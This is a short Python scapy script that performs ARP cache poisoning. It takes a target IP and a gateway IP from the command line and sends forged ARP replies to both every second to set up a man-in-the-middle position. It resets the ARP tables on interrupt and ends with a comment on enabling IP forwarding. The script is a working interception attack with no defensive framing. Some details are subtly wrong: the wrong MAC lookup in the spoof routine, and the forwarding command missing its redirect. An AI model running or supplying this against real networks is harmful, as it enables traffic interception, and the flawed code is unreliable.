#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys
import optparse


def get_parsers():
    parser=optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="Used to Specify Target ip Address")
    parser.add_option("-r","--router",dest="router_ip",help="Used to Specify router or gateway ip Address")
    (opt,arg)=parser.parse_args()
    if not opt.target_ip:
        parser.error("[-] Please Specify a Target ip,--help for more info")
    elif not opt.router_ip:
        parser.error("[-] Please Specify a router or gateway ip Address,--help for more info")
    return opt


# scapy.ls(scapy.ARP())
def get_mac(ip):
    arp_req=scapy.ARP(pdst=ip)
    brod=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    brod_cst=brod/arp_req
    ans_list=scapy.srp(brod_cst,timeout=1,verbose=False)[0]
    return ans_list[0][1].hwsrc


def spoof(target_ipe,spoof_ipe):
    target_mac=get_mac(spoof_ipe)
    packet=scapy.ARP(op=2,pdst=target_ipe,hwdst=target_mac,psrc=spoof_ipe)
    # print(target_mac+" :MAC ")
    scapy.send(packet,verbose=False)


def restore(des_ip,sou_ip):
    des_mac=get_mac(des_ip)
    sou_mac=get_mac(sou_ip)
    packet=scapy.ARP(op=2,pdst=des_ip,hwdst=des_mac,psrc=sou_ip,hwsrc=sou_mac)
    scapy.send(packet,verbose=False,count=4)


cc=0
option=get_parsers()
target_ip=option.target_ip
gateway_ip=option.router_ip
try:
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip, target_ip)
        cc+=2
        sys.stdout.write("\r[+] Packets sent :"+str(cc))
        sys.stdout.flush()
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[+] Detected ctrl +C .....Resetting ARP tables....Please Wait")
    restore(target_ip,gateway_ip)
    print("[+] Restored packed sent to victim")
    restore(gateway_ip,target_ip)
    print("[+] Restored packed sent to router")
    print("[+] Restoring Successfully done...Quitting .....")




#enable ip forwarding using command: echo 1 /proc/sys/net/ipv4/ip_forward